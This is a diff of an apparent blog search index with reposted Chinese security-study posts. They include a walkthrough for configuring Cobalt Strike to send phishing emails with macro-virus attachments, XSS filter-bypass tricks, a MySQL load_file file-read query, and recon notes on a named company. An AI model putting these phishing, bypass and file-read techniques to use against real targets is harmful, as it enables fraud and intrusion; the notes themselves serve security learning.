-<img src="1503868-20200207103645990-231595883.png" alt width="563" height="348">
-
-<p> </p>
-<p>至于为什么切换到就不会掉出来，而用中文，玩15分钟（测试过，15分钟左右，不会偏差太多）就会掉出来，我也不知道，反正让育碧工程师出来挨打就对了。</p>
-<p> gogogo</p>
-<img src="1503868-20200207104406230-773624798.png" alt width="830" height="467">
-
-<p> </p>
-]]></content>
-      <categories>
-        <category>cnblogs</category>
-      </categories>
-  </entry>
-  <entry>
     <title>shiro漏洞利用_入门</title>
     <url>/2020/10/29/shiro%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8_%E5%85%A5%E9%97%A8/</url>
     <content><![CDATA[<p>来自之前cnblog的博客<br><a class="link" href="https://www.cnblogs.com/This-is-Y/p/13899977.html">源地址：https://www.cnblogs.com/This-is-Y/p/13899977.html<i class="fas fa-external-link-alt"></i></a></p>
@@ -3928,6 +4159,124 @@ document.getElementById("t6").innerHTML=muti;   //123</pre>
       </categories>
   </entry>
   <entry>
+    <title>uplay游戏玩15分钟就强制退出来的解决办法</title>
+    <url>/2020/02/07/uplay%E6%B8%B8%E6%88%8F%E7%8E%A915%E5%88%86%E9%92%9F%E5%B0%B1%E5%BC%BA%E5%88%B6%E9%80%80%E5%87%BA%E6%9D%A5%E7%9A%84%E8%A7%A3%E5%86%B3%E5%8A%9E%E6%B3%95/</url>
+    <content><![CDATA[<p>来自之前cnblog的博客<br><a class="link" href="https://www.cnblogs.com/This-is-Y/p/12272226.html">源地址：https://www.cnblogs.com/This-is-Y/p/12272226.html<i class="fas fa-external-link-alt"></i></a></p>
+<p>按下win键，输入语言，打开语言设置。</p>
+<img src="1503868-20200207102923968-791006671.png" alt width="558" height="499">
+
+<p> </p>
+<p> 找到首选语言，点击添加首选语言，添加English（US）这个。</p>
+<img src="1503868-20200207103125879-643552617.png" alt width="561" height="291">
+
+<p>然后在启动uplay游戏前，按win+空格切换到英语，这样子就可以愉快的玩耍了，不会再15分钟掉出来了</p>
+<img src="1503868-20200207103645990-231595883.png" alt width="563" height="348">
+
+<p> </p>
+<p>至于为什么切换到就不会掉出来，而用中文，玩15分钟（测试过，15分钟左右，不会偏差太多）就会掉出来，我也不知道，反正让育碧工程师出来挨打就对了。</p>
+<p> gogogo</p>
+<img src="1503868-20200207104406230-773624798.png" alt width="830" height="467">
+
+<p> </p>
+]]></content>
+      <categories>
+        <category>cnblogs</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>使用Cobalr strike发送钓鱼邮件</title>
+    <url>/2020/06/18/%E4%BD%BF%E7%94%A8Cobalr%20strike%E5%8F%91%E9%80%81%E9%92%93%E9%B1%BC%E9%82%AE%E4%BB%B6/</url>
+    <content><![CDATA[<p>来自之前cnblog的博客<br><a class="link" href="https://www.cnblogs.com/This-is-Y/p/13159570.html">源地址：https://www.cnblogs.com/This-is-Y/p/13159570.html<i class="fas fa-external-link-alt"></i></a></p>
+<p>本文参考<a class="link" href="https://www.freebuf.com/sectool/124905.html">https://www.freebuf.com/sectool/124905.html<i class="fas fa-external-link-alt"></i></a></p>
+<p>感谢前人指路</p>
+<p> </p>
+<p>前面的建立一个office宏病毒、克隆一个网站等操作，在这片freebuf的文章中写的很清楚详细了。</p>
+<p>这里我就针对填写参数做一些细节补充：</p>
+<p><strong>Targets：</strong>是要发送邮箱地址的文件，比如：</p>
+<img src="1503868-20200618193453413-182685379.png" width="900" loading="lazy">
+
+<p> </p>
+<p> </p>
+<p> 建立一个文件，一个邮箱一行，不要有别的东西</p>
+<p><strong>Template：</strong>是要发送邮件的模板，这个可以在个人邮箱中导出一个即可。</p>
+<p>关于如何导出，我用的qq邮箱，这里我以qq邮箱为例</p>
+<p>1.因为要自定义邮件内容，所以先写好一封邮件，即模板，发送给自己的小号或基友。然后在 已发送 中找到那封邮件。</p>
+<img src="1503868-20200618193920491-1425033186.png" width="900" loading="lazy">
+
+<p> </p>
+<p>点击右边那个小到看不见的<img src="1503868-20200618194007108-157067518.png" alt loading="lazy">这个玩意（红箭头标出来了），然后导出为eml文件即可</p>
+<p><strong>Attachment：</strong>放入我们搞好的word（用中文文件名似乎会乱码）</p>
+<p><strong>Embed url：</strong>填写搭建好的网站，然后配置好</p>
+<p><strong>mailserver：</strong>我用的qq邮箱，这里就用qq邮箱做示例。其他的163等邮箱大同小异。</p>
+<p>　　首先在qq邮箱 <strong>设置</strong>、<strong>账户</strong> 中找到 <strong>POP3/IMAP/SMTP/Exchange/CardDAV/CalDAV服务</strong> 这一列（POP3/SMTP/IMAP等服务是什么左转百度或谷歌wiki，他们讲的比我好）。打开POP/SMTP服务以及IMAP/SMTP服务（打开这些服务的风险qq邮箱都会告诉你，自行斟酌，出了啥岔子与我无关）打开后，点击下面的生成授权码。会获得一组神秘代码，保存下来。</p>
+<p>　　<img src="1503868-20200618195235715-123373268.png" width="900">　　</p>
+<p>　　回到cs中。点开Mail Server后面的这个</p>
+<p> 　　<img src="1503868-20200618195720809-1663090374.png" alt loading="lazy"></p>
+<p> </p>
+<p> 　　进入到配置页面</p>
+<p>　　<img src="1503868-20200618195802359-1900204309.png" alt loading="lazy"></p>
+<p> </p>
+<p> 　　这边的参数选项。</p>
+<p>　　<strong>SMTP host：</strong> 即qq邮箱SMTP服务地址，smtp.qq.com。这个可以自行百度。这里有一篇博客写了这些，但是端口号似乎有些不对，还请自行判断<a class="link" href="https://blog.csdn.net/Gents_hu/article/details/92219811">https://blog.csdn.net/Gents_hu/article/details/92219811<i class="fas fa-external-link-alt"></i></a></p>
+<p>　　<strong>SMTP Port：</strong>即允许SMTP服务的端口号。和上面的host配套来的，这边QQ邮箱的端口号是 465</p>
+<p>　　<strong>Username：</strong>举个例子。比如我的邮箱地址是<a class="link" href="mailto:&#x39;&#x35;&#x32;&#x37;&#49;&#x34;&#x31;&#x33;&#x38;&#64;&#113;&#x71;&#x2e;&#x63;&#111;&#x6d;">&#x39;&#x35;&#x32;&#x37;&#49;&#x34;&#x31;&#x33;&#x38;&#64;&#113;&#x71;&#x2e;&#x63;&#111;&#x6d;<i class="fas fa-external-link-alt"></i></a>，那这里就填952714138。就是@符号前面的那个</p>
+<p>　　<strong>Password（密码）：</strong>就是前面开启SMTP服务是的那串神秘代码，不是你的qq密码！不是你的qq密码！不是你的qq密码！</p>
+<p>　　<strong>Random Delay：</strong>似乎是等待随机延迟发送（我瞎猜的）。这里默认0就好了。</p>
+<p>　　<strong>Connetion：</strong>连接协议，qq邮箱SMTP服务用的ssl连接，所以这里选ssl</p>
+<p>　　配置好后大概是这个样子</p>
+<p>　　<img src="1503868-20200618201058685-518424786.png" alt loading="lazy"></p>
+<p>　　点解set保存设置。</p>
+<p><strong>bounce to：</strong>这个是根据你的邮件名来填写的，比方说我的邮件地址是<a class="link" href="mailto:&#x39;&#53;&#50;&#55;&#x31;&#x34;&#x31;&#x33;&#56;&#x40;&#113;&#x71;&#x2e;&#99;&#x6f;&#109;">&#x39;&#53;&#50;&#55;&#x31;&#x34;&#x31;&#x33;&#56;&#x40;&#113;&#x71;&#x2e;&#99;&#x6f;&#109;<i class="fas fa-external-link-alt"></i></a>，那么这里就填写<a class="link" href="mailto:&#57;&#53;&#50;&#x37;&#x31;&#x34;&#49;&#51;&#56;&#64;&#x71;&#x71;&#x2e;&#x63;&#x6f;&#109;">&#57;&#53;&#50;&#x37;&#x31;&#x34;&#49;&#51;&#56;&#64;&#x71;&#x71;&#x2e;&#x63;&#x6f;&#109;<i class="fas fa-external-link-alt"></i></a>。当然，qq邮箱有一个英文邮箱账号，填写那个也是可以的。如果填写不正确，cs会报错</p>
+<img src="1503868-20200618195101320-369498795.png" alt loading="lazy">
+
+<p> </p>
+<p>全部配置好后差不多就是这样子</p>
+<img src="1503868-20200618201158502-1594240584.png" alt loading="lazy">
+
+<p>这样就表示发送成功了。</p>
+<img src="1503868-20200618201554578-968296910.png" alt loading="lazy">
+
+<p> </p>
+]]></content>
+      <categories>
+        <category>cnblogs</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>信息搜集</title>
+    <url>/2021/06/04/%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/</url>
+    <content><![CDATA[<p>freebuf：<a class="link" href="https://www.freebuf.com/articles/web/190403.html">https://www.freebuf.com/articles/web/190403.html<i class="fas fa-external-link-alt"></i></a><br><img src="1543072448_5bf96ac069a0b.png" alt="1543072448_5bf96ac069a0b"></p>
+<h2 id="信息搜集内容"><a href="#信息搜集内容" class="headerlink" title="信息搜集内容"></a>信息搜集内容</h2><ul>
+<li>服务器信息(端口、服务、IP)</li>
+<li>网站信息（服务器操作系统、中间件、数据库、编程语言、敏感目录与文件、旁站查询、C段查询）</li>
+<li>域名信息( whois、备案信息、子域名收集)</li>
+<li>网站管理员信息(姓名、职务、生日、联系电话、邮件地址)</li>
+</ul>
+<p>判断CDN<br>    多地ping<br>        <a class="link" href="http://ping.chinaz.com/">http://ping.chinaz.com/<i class="fas fa-external-link-alt"></i></a> 站长之家ping测试在最后有国外的服务器<br>        <a class="link" href="https://www.wepcc.com/">https://www.wepcc.com/<i class="fas fa-external-link-alt"></i></a></p>
+<p>绕过CDN<br>CDN按流浪计费，可能不在境外使用，或者它的边缘业务（子域名）不会架设CDN服务</p>
+<ul>
+<li>国外PING</li>
+<li>子域名PING（子域名在同一个服务器或者C段）</li>
+<li>邮件服务器（子域名在同一个服务器或者C段）</li>
+<li>DNS解析记录（从前没钱挂CDN，IP被记录下来了）<br>  <a class="link" href="https://site.ip138.com/">https://site.ip138.com<i class="fas fa-external-link-alt"></i></a> （推荐）<br>  <a class="link" href="https://viewdns.info/history">https://viewdns.info/history<i class="fas fa-external-link-alt"></i></a> （推荐）<br>  <a class="link" href="https://securitytrails.com/">https://securitytrails.com/<i class="fas fa-external-link-alt"></i></a></li>
+</ul>
+<p>子域名查询：</p>
+<ul>
+<li><p>oneforall  <a class="link" href="https://github.com/shmilylty/OneForAll">https://github.com/shmilylty/OneForAll<i class="fas fa-external-link-alt"></i></a></p>
+</li>
+<li><p>证书查询 </p>
+<p>   <a class="link" href="https://myssl.com/">https://myssl.com/<i class="fas fa-external-link-alt"></i></a><br>   <a class="link" href="https://search.censys.io/">https://search.censys.io/<i class="fas fa-external-link-alt"></i></a><br>   <a class="link" href="https://crt.sh/?Identity=">https://crt.sh/?Identity=<i class="fas fa-external-link-alt"></i></a><br>   <a class="link" href="https://spyse.com/">https://spyse.com/<i class="fas fa-external-link-alt"></i></a>  查子域名收费</p>
+</li>
+</ul>
+<p>以默安为例子</p>
+<p>公司全称叫：杭州默安科技有限公司<br>官网：<a class="link" href="https://www.moresec.cn/">https://www.moresec.cn/<i class="fas fa-external-link-alt"></i></a></p>
+<p>在企查查上查到对外投资四家公司<br>    北京默安科技有限公司<br>    深圳默安科技有限公司<br>    上海默知安科技有限公司<br>    长沙火线云网络科技有限公司</p>
+<p><img src="image-20210604153232318.png" alt="image-20210604153232318"></p>
+<p>查电话查到另一家公司  0571-57890068<br>    杭州云中盟股权投资合伙企业（有限合伙）</p>
+<p>留个坑</p>
+]]></content>
+  </entry>
+  <entry>
     <title>信息收集笔记</title>
     <url>/2019/07/20/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E7%AC%94%E8%AE%B0/</url>
     <content><![CDATA[<p>来自之前cnblog的博客<br><a class="link" href="https://www.cnblogs.com/This-is-Y/p/11216357.html">源地址：https://www.cnblogs.com/This-is-Y/p/11216357.html<i class="fas fa-external-link-alt"></i></a></p>
@@ -4015,65 +4364,6 @@ document.getElementById("t6").innerHTML=muti;   //123</pre>
       </categories>
   </entry>
   <entry>
-    <title>使用Cobalr strike发送钓鱼邮件</title>
-    <url>/2020/06/18/%E4%BD%BF%E7%94%A8Cobalr%20strike%E5%8F%91%E9%80%81%E9%92%93%E9%B1%BC%E9%82%AE%E4%BB%B6/</url>
-    <content><![CDATA[<p>来自之前cnblog的博客<br><a class="link" href="https://www.cnblogs.com/This-is-Y/p/13159570.html">源地址：https://www.cnblogs.com/This-is-Y/p/13159570.html<i class="fas fa-external-link-alt"></i></a></p>
-<p>本文参考<a class="link" href="https://www.freebuf.com/sectool/124905.html">https://www.freebuf.com/sectool/124905.html<i class="fas fa-external-link-alt"></i></a></p>
-<p>感谢前人指路</p>
-<p> </p>
-<p>前面的建立一个office宏病毒、克隆一个网站等操作，在这片freebuf的文章中写的很清楚详细了。</p>
-<p>这里我就针对填写参数做一些细节补充：</p>
-<p><strong>Targets：</strong>是要发送邮箱地址的文件，比如：</p>
-<img src="1503868-20200618193453413-182685379.png" width="900" loading="lazy">
-
-<p> </p>
-<p> </p>
-<p> 建立一个文件，一个邮箱一行，不要有别的东西</p>
-<p><strong>Template：</strong>是要发送邮件的模板，这个可以在个人邮箱中导出一个即可。</p>
-<p>关于如何导出，我用的qq邮箱，这里我以qq邮箱为例</p>
-<p>1.因为要自定义邮件内容，所以先写好一封邮件，即模板，发送给自己的小号或基友。然后在 已发送 中找到那封邮件。</p>
-<img src="1503868-20200618193920491-1425033186.png" width="900" loading="lazy">
-
-<p> </p>
-<p>点击右边那个小到看不见的<img src="1503868-20200618194007108-157067518.png" alt loading="lazy">这个玩意（红箭头标出来了），然后导出为eml文件即可</p>
-<p><strong>Attachment：</strong>放入我们搞好的word（用中文文件名似乎会乱码）</p>
-<p><strong>Embed url：</strong>填写搭建好的网站，然后配置好</p>
-<p><strong>mailserver：</strong>我用的qq邮箱，这里就用qq邮箱做示例。其他的163等邮箱大同小异。</p>
-<p>　　首先在qq邮箱 <strong>设置</strong>、<strong>账户</strong> 中找到 <strong>POP3/IMAP/SMTP/Exchange/CardDAV/CalDAV服务</strong> 这一列（POP3/SMTP/IMAP等服务是什么左转百度或谷歌wiki，他们讲的比我好）。打开POP/SMTP服务以及IMAP/SMTP服务（打开这些服务的风险qq邮箱都会告诉你，自行斟酌，出了啥岔子与我无关）打开后，点击下面的生成授权码。会获得一组神秘代码，保存下来。</p>
-<p>　　<img src="1503868-20200618195235715-123373268.png" width="900">　　</p>
-<p>　　回到cs中。点开Mail Server后面的这个</p>
-<p> 　　<img src="1503868-20200618195720809-1663090374.png" alt loading="lazy"></p>
-<p> </p>
-<p> 　　进入到配置页面</p>
-<p>　　<img src="1503868-20200618195802359-1900204309.png" alt loading="lazy"></p>
-<p> </p>
-<p> 　　这边的参数选项。</p>
-<p>　　<strong>SMTP host：</strong> 即qq邮箱SMTP服务地址，smtp.qq.com。这个可以自行百度。这里有一篇博客写了这些，但是端口号似乎有些不对，还请自行判断<a class="link" href="https://blog.csdn.net/Gents_hu/article/details/92219811">https://blog.csdn.net/Gents_hu/article/details/92219811<i class="fas fa-external-link-alt"></i></a></p>
-<p>　　<strong>SMTP Port：</strong>即允许SMTP服务的端口号。和上面的host配套来的，这边QQ邮箱的端口号是 465</p>
-<p>　　<strong>Username：</strong>举个例子。比如我的邮箱地址是<a class="link" href="mailto:&#57;&#x35;&#50;&#x37;&#49;&#52;&#x31;&#51;&#x38;&#64;&#x71;&#x71;&#x2e;&#99;&#111;&#109;">&#57;&#x35;&#50;&#x37;&#49;&#52;&#x31;&#51;&#x38;&#64;&#x71;&#x71;&#x2e;&#99;&#111;&#109;<i class="fas fa-external-link-alt"></i></a>，那这里就填952714138。就是@符号前面的那个</p>
-<p>　　<strong>Password（密码）：</strong>就是前面开启SMTP服务是的那串神秘代码，不是你的qq密码！不是你的qq密码！不是你的qq密码！</p>
-<p>　　<strong>Random Delay：</strong>似乎是等待随机延迟发送（我瞎猜的）。这里默认0就好了。</p>
-<p>　　<strong>Connetion：</strong>连接协议，qq邮箱SMTP服务用的ssl连接，所以这里选ssl</p>
-<p>　　配置好后大概是这个样子</p>
-<p>　　<img src="1503868-20200618201058685-518424786.png" alt loading="lazy"></p>
-<p>　　点解set保存设置。</p>
-<p><strong>bounce to：</strong>这个是根据你的邮件名来填写的，比方说我的邮件地址是<a class="link" href="mailto:&#57;&#x35;&#50;&#x37;&#x31;&#52;&#49;&#x33;&#56;&#x40;&#x71;&#113;&#x2e;&#99;&#x6f;&#x6d;">&#57;&#x35;&#50;&#x37;&#x31;&#52;&#49;&#x33;&#56;&#x40;&#x71;&#113;&#x2e;&#99;&#x6f;&#x6d;<i class="fas fa-external-link-alt"></i></a>，那么这里就填写<a class="link" href="mailto:&#57;&#x35;&#x32;&#55;&#49;&#52;&#x31;&#51;&#56;&#64;&#113;&#x71;&#x2e;&#x63;&#x6f;&#109;">&#57;&#x35;&#x32;&#55;&#49;&#52;&#x31;&#51;&#56;&#64;&#113;&#x71;&#x2e;&#x63;&#x6f;&#109;<i class="fas fa-external-link-alt"></i></a>。当然，qq邮箱有一个英文邮箱账号，填写那个也是可以的。如果填写不正确，cs会报错</p>
-<img src="1503868-20200618195101320-369498795.png" alt loading="lazy">
-
-<p> </p>
-<p>全部配置好后差不多就是这样子</p>
-<img src="1503868-20200618201158502-1594240584.png" alt loading="lazy">
-
-<p>这样就表示发送成功了。</p>
-<img src="1503868-20200618201554578-968296910.png" alt loading="lazy">
-
-<p> </p>
-]]></content>
-      <categories>
-        <category>cnblogs</category>
-      </categories>
-  </entry>
-  <entry>
     <title>关于WPA加密的wifi通过握手包跑字典破解</title>
     <url>/2020/04/06/%E5%85%B3%E4%BA%8EWPA%E5%8A%A0%E5%AF%86%E7%9A%84wifi%E9%80%9A%E8%BF%87%E6%8F%A1%E6%89%8B%E5%8C%85%E8%B7%91%E5%AD%97%E5%85%B8%E7%A0%B4%E8%A7%A3/</url>
     <content><![CDATA[<p>来自之前cnblog的博客<br><a class="link" href="https://www.cnblogs.com/This-is-Y/p/12639589.html">源地址：https://www.cnblogs.com/This-is-Y/p/12639589.html<i class="fas fa-external-link-alt"></i></a></p>
@@ -4112,6 +4402,31 @@ document.getElementById("t6").innerHTML=muti;   //123</pre>
 
 <p> </p>
 <p>这速度真心可以啊</p>
+<p> </p>
+]]></content>
+      <categories>
+        <category>cnblogs</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>博客园装饰</title>
+    <url>/2020/01/18/%E5%8D%9A%E5%AE%A2%E5%9B%AD%E8%A3%85%E9%A5%B0/</url>
+    <content><![CDATA[<p>来自之前cnblog的博客<br><a class="link" href="https://www.cnblogs.com/This-is-Y/p/12210655.html">源地址：https://www.cnblogs.com/This-is-Y/p/12210655.html<i class="fas fa-external-link-alt"></i></a></p>
+<p>装饰一下博客</p>
+<p>开通js什么的这些功能网上都很多很全了，这里记录找到的几个写得比较好的博客</p>
+<p>较为全面的两个：<a class="link" href="https://www.cnblogs.com/zhaopei/p/4174811.html">https://www.cnblogs.com/zhaopei/p/4174811.html<i class="fas fa-external-link-alt"></i></a></p>
+<p><a class="link" href="https://www.cnblogs.com/guokaifeng/p/11121939.html">https://www.cnblogs.com/guokaifeng/p/11121939.html<i class="fas fa-external-link-alt"></i></a> </p>
+<p>（现在生成外链链接可能会没用，歌单上面的id其实就是外链id</p>
+<img src="1503868-20200118230136057-1795119443.png" alt>
+
+<p> </p>
+<p>可以看到这里的id和上面一样，至于其他的参数，前面两个教程都有解释</p>
+<img src="1503868-20200118230447941-838547165.png" alt>
+
+<p> </p>
+<p>有些时候发现博客园装饰出了点问题，不妨把这个禁用了 ↓↓</p>
+<img src="1503868-20200312211648481-430248655.png" alt>
+
 <p> </p>
 ]]></content>
       <categories>
@@ -4250,31 +4565,6 @@ document.getElementById("t6").innerHTML=muti;   //123</pre>
 <p> 火绒 </p>
 <p>hipstray.exe<br> wsctrl.exe<br> usysdiag.exe</p>
 <p><br><br><br><br><br></p>
-]]></content>
-      <categories>
-        <category>cnblogs</category>
-      </categories>
-  </entry>
-  <entry>
-    <title>博客园装饰</title>
-    <url>/2020/01/18/%E5%8D%9A%E5%AE%A2%E5%9B%AD%E8%A3%85%E9%A5%B0/</url>
-    <content><![CDATA[<p>来自之前cnblog的博客<br><a class="link" href="https://www.cnblogs.com/This-is-Y/p/12210655.html">源地址：https://www.cnblogs.com/This-is-Y/p/12210655.html<i class="fas fa-external-link-alt"></i></a></p>
-<p>装饰一下博客</p>
-<p>开通js什么的这些功能网上都很多很全了，这里记录找到的几个写得比较好的博客</p>
-<p>较为全面的两个：<a class="link" href="https://www.cnblogs.com/zhaopei/p/4174811.html">https://www.cnblogs.com/zhaopei/p/4174811.html<i class="fas fa-external-link-alt"></i></a></p>
-<p><a class="link" href="https://www.cnblogs.com/guokaifeng/p/11121939.html">https://www.cnblogs.com/guokaifeng/p/11121939.html<i class="fas fa-external-link-alt"></i></a> </p>
-<p>（现在生成外链链接可能会没用，歌单上面的id其实就是外链id</p>
-<img src="1503868-20200118230136057-1795119443.png" alt>
-
-<p> </p>
-<p>可以看到这里的id和上面一样，至于其他的参数，前面两个教程都有解释</p>
-<img src="1503868-20200118230447941-838547165.png" alt>
-
-<p> </p>
-<p>有些时候发现博客园装饰出了点问题，不妨把这个禁用了 ↓↓</p>
-<img src="1503868-20200312211648481-430248655.png" alt>
-
-<p> </p>
 ]]></content>
       <categories>
         <category>cnblogs</category>
@@ -4824,38 +5114,6 @@ insert into test1 value(3,15);
       </categories>
   </entry>
   <entry>
-    <title>浅谈xss的各种触发方式以及防护绕过</title>
-    <url>/2020/03/07/%E6%B5%85%E8%B0%88xss%E7%9A%84%E5%90%84%E7%A7%8D%E8%A7%A6%E5%8F%91%E6%96%B9%E5%BC%8F%E4%BB%A5%E5%8F%8A%E9%98%B2%E6%8A%A4%E7%BB%95%E8%BF%87/</url>
-    <content><![CDATA[<p>来自之前cnblog的博客<br><a class="link" href="https://www.cnblogs.com/This-is-Y/p/12438723.html">源地址：https://www.cnblogs.com/This-is-Y/p/12438723.html<i class="fas fa-external-link-alt"></i></a></p>
-<p>触发方式都写在里面了</p>
-<img src="1503868-20200307205424570-687485412.png" alt width="1008" height="359">
-
-<p> </p>
-<p> </p>
-<p>只写部分，更多触发事件可以参考这两篇文章</p>
-<p><a class="link" href="https://blog.csdn.net/qq_36374896/article/details/82755793">https://blog.csdn.net/qq_36374896/article/details/82755793<i class="fas fa-external-link-alt"></i></a></p>
-<p><a class="link" href="https://www.cnblogs.com/webzhuo/p/4155594.html">https://www.cnblogs.com/webzhuo/p/4155594.html<i class="fas fa-external-link-alt"></i></a></p>
-<p> </p>
-<p>再说一下防护：</p>
-<p>输入检测：</p>
-<p>htmlspecialchars函数：用来把一些预定义的字符转换为HTML实体,默认不开启对单引号的过滤</p>
-<p>　　绕过:用onmouseover或者onclick等方式，像xsslabs里第2,3,4题就是用onclick</p>
-<p>关键字黑名单：</p>
-<p>　　换一个关键字，反正上面有这么多。</p>
-<p>　　用html字符实体编码，网站<a class="link" href="https://www.qqxiuzi.cn/bianma/zifushiti.php">https://www.qqxiuzi.cn/bianma/zifushiti.php<i class="fas fa-external-link-alt"></i></a></p>
-<p>　　或者用大小写绕过</p>
-<p>　　或者使用tab制表符，空格，回车等（比如jav ascri pt:alert(1) 。这个要先在别的文本框输入tab进去（有些情况下，按下tab就跳到下一个别的地方去了），在把payload复制过来使用。</p>
-<p>　　当遇到清除关键字的时候，可以尝试双写绕过，scriscriptpt，清除一个script后，剩下的拼接回来又是一个script，这个在注入里面也会用到</p>
-<p> </p>
-<p>同时昨天通过学长，得到一大票xsspayload，也放在这里，可以拿来爆破</p>
-<p><a class="link" href="https://github.com/TheKingOfDuck/easyXssPayload">https://github.com/TheKingOfDuck/easyXssPayload<i class="fas fa-external-link-alt"></i></a></p>
-<p> </p>
-]]></content>
-      <categories>
-        <category>cnblogs</category>
-      </categories>
-  </entry>
-  <entry>
     <title>注入的原理以及防御</title>
     <url>/2021/04/04/%E6%B3%A8%E5%85%A5%E7%9A%84%E5%8E%9F%E7%90%86%E4%BB%A5%E5%8F%8A%E9%98%B2%E5%BE%A1/</url>
     <content><![CDATA[<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>参考自：<a class="link" href="https://juejin.cn/post/6844903917654900743">https://juejin.cn/post/6844903917654900743<i class="fas fa-external-link-alt"></i></a></p>
@@ -4939,6 +5197,38 @@ insert into test1 value(3,15);
 </li>
 </ol>
 ]]></content>
+  </entry>
+  <entry>
+    <title>浅谈xss的各种触发方式以及防护绕过</title>
+    <url>/2020/03/07/%E6%B5%85%E8%B0%88xss%E7%9A%84%E5%90%84%E7%A7%8D%E8%A7%A6%E5%8F%91%E6%96%B9%E5%BC%8F%E4%BB%A5%E5%8F%8A%E9%98%B2%E6%8A%A4%E7%BB%95%E8%BF%87/</url>
+    <content><![CDATA[<p>来自之前cnblog的博客<br><a class="link" href="https://www.cnblogs.com/This-is-Y/p/12438723.html">源地址：https://www.cnblogs.com/This-is-Y/p/12438723.html<i class="fas fa-external-link-alt"></i></a></p>
+<p>触发方式都写在里面了</p>
+<img src="1503868-20200307205424570-687485412.png" alt width="1008" height="359">
+
+<p> </p>
+<p> </p>
+<p>只写部分，更多触发事件可以参考这两篇文章</p>
+<p><a class="link" href="https://blog.csdn.net/qq_36374896/article/details/82755793">https://blog.csdn.net/qq_36374896/article/details/82755793<i class="fas fa-external-link-alt"></i></a></p>
+<p><a class="link" href="https://www.cnblogs.com/webzhuo/p/4155594.html">https://www.cnblogs.com/webzhuo/p/4155594.html<i class="fas fa-external-link-alt"></i></a></p>
+<p> </p>
+<p>再说一下防护：</p>
+<p>输入检测：</p>
+<p>htmlspecialchars函数：用来把一些预定义的字符转换为HTML实体,默认不开启对单引号的过滤</p>
+<p>　　绕过:用onmouseover或者onclick等方式，像xsslabs里第2,3,4题就是用onclick</p>
+<p>关键字黑名单：</p>
+<p>　　换一个关键字，反正上面有这么多。</p>
+<p>　　用html字符实体编码，网站<a class="link" href="https://www.qqxiuzi.cn/bianma/zifushiti.php">https://www.qqxiuzi.cn/bianma/zifushiti.php<i class="fas fa-external-link-alt"></i></a></p>
+<p>　　或者用大小写绕过</p>
+<p>　　或者使用tab制表符，空格，回车等（比如jav ascri pt:alert(1) 。这个要先在别的文本框输入tab进去（有些情况下，按下tab就跳到下一个别的地方去了），在把payload复制过来使用。</p>
+<p>　　当遇到清除关键字的时候，可以尝试双写绕过，scriscriptpt，清除一个script后，剩下的拼接回来又是一个script，这个在注入里面也会用到</p>
+<p> </p>
+<p>同时昨天通过学长，得到一大票xsspayload，也放在这里，可以拿来爆破</p>
+<p><a class="link" href="https://github.com/TheKingOfDuck/easyXssPayload">https://github.com/TheKingOfDuck/easyXssPayload<i class="fas fa-external-link-alt"></i></a></p>
+<p> </p>
+]]></content>
+      <categories>
+        <category>cnblogs</category>
+      </categories>
   </entry>
   <entry>
     <title>破解部分windows密码（win7用粘滞键，winxp等用pe）</title>
@@ -5118,6 +5408,101 @@ insert into test1 value(3,15);
       <categories>
         <category>cnblogs</category>
       </categories>
+  </entry>
+  <entry>
+    <title>面试题查漏补缺</title>
+    <url>/2021/06/10/%E9%9D%A2%E8%AF%95%E9%A2%98%E6%9F%A5%E6%BC%8F%E8%A1%A5%E7%BC%BA/</url>
+    <content><![CDATA[<h2 id="1-快速判断目标是Linux还是Windows"><a href="#1-快速判断目标是Linux还是Windows" class="headerlink" title="1. 快速判断目标是Linux还是Windows"></a>1. 快速判断目标是Linux还是Windows</h2><p>linux对大小写敏感，<br>win不敏感，<br>目录修改一下字母大小写，如果正常访问，大概率是win，不能就可能是linux</p>
+<h2 id="2-站库分离"><a href="#2-站库分离" class="headerlink" title="2. 站库分离"></a>2. 站库分离</h2><p><a class="link" href="https://blog.csdn.net/Vdieoo/article/details/109515514">https://blog.csdn.net/Vdieoo/article/details/109515514<i class="fas fa-external-link-alt"></i></a></p>
+<ul>
+<li><ul>
+<li>从 web 网站打入进而打站库分离的数据库，内网渗透<br>①. 从 web 入口通常就是通过网站的各种漏洞来 getshell，比如文件上传、命令执行、代码        执行、还有 SQL 注入写入一句话（into outfile、日志备份等）。<br>②. 在获得 web 权限或者有诸如文件读取等漏洞时，我们还读数据库配置文件、对数据库内        容分析、查找数据库备份，进而对数据库目标 ip 进行渗透，以便后续操作</li>
+</ul>
+</li>
+<li>从数据库打入进而打站库分离的 web 网站，内网渗透<br>①. MySql<br>（1）定位 web 端 ip 地址</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select * from information_schema.PROCESSLIST;</span><br></pre></td></tr></table></figure>
+
+<p>在得到了 web 端的 ip 我们可以进而对 web 端进行渗透。<br>（2）load_file () 获取数据库所在服务器的敏感信息<br>如果没有 secure_file_priv 参数的限制（MySQL5.7 以下）我们还可以用 load_file() 函数对文件内容进行读取。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select load_file(&#39;C:&#x2F;test.txt&#39;);</span><br></pre></td></tr></table></figure>
+
+<p>②. MsSql<br>（1） 判断是否站库分离<br>得到客户端主机名: select host_name();<br>得到服务端主机名: select @@servername;<br>根据结果判断是否分离，结果一样就可能站库同服务器，结果不一样就是站库分离。</p>
+<h2 id="3-CSRF"><a href="#3-CSRF" class="headerlink" title="3. CSRF"></a>3. CSRF</h2><p>Cross-site requestforgery，也就是跨站请求伪造<br>XSS攻击是跨站脚本攻击，CSRF攻击是请求伪造，XSS来自用户的手，完成一些操作或者是泄露信息，CSRF攻击本不是出自用户之手，却经过第三方恶意攻击者的处理，伪装成了受信任用户的“亲历亲为”。两者的关系属于 ，XSS是实现CSRF的诸多途径中的一条，但并不是唯一的一条。<br>常见的CSRF在用户修改密码的地方</p>
+<p><img src="image-20210610101822012.png" alt="image-20210610101822012"></p>
